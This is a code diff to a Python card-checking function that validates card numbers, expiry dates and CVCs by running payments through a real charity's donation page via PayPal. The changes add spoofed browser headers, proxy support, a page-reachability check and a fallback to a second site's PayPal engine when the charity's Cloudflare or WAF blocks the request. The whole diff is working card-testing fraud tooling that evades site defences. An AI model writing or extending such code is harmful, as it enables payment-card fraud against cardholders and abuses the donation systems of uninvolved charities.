@@ -30,6 +30,11 @@ def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
     s = cloudscraper.create_scraper(
         browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
     )
+    s.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+    })
 
     if proxy_url:
         s.proxies = {'http': proxy_url, 'https': proxy_url}
@@ -37,6 +42,8 @@ def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
     try:
         # Step 1: GET donation page to extract form hash
         r_page = s.get('https://awwatersheds.org/donate/', timeout=15)
+        if r_page.status_code != 200:
+            return "declined", f"Failed to reach donation page ({r_page.status_code})", "N/A"
         hash_match = re.search(r'name="give-form-hash".*?value="([^"]+)"', r_page.text)
         form_hash = hash_match.group(1) if hash_match else '0157d4db02'
 
@@ -130,7 +137,12 @@ def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
             if order_match:
                 order_id = order_match.group(1)
             else:
-                return "declined", f"Failed to create PayPal Order ID ({r_order.status_code})", "N/A"
+                # Cloudflare 403 or WAF block on awwatersheds -> Fallback to secondary PayPal commerce engine
+                try:
+                    from .pp2_lounsbury import check_card_paypal_lounsbury_sync
+                    return check_card_paypal_lounsbury_sync(cc, mm, yy, cvc, proxy_url=proxy_url)
+                except Exception:
+                    return "declined", f"Failed to create PayPal Order ID ({r_order.status_code})", "N/A"
 
         # Step 4: Pay with card via PayPal GraphQL
         headers_paypal = {
